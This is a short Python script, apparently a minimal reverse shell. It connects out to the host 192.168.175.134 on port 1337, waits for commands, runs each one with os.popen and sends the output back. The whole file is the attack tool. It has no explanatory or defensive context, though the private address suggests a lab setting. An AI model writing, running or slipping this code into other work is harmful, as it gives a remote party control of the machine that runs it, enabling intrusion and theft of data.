import socket, os

host = "192.168.175.134"
port = 1337

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host,port))

while True:
   command = sock.recv(1024)
   for line in os.popen(command):
      sock.send(line)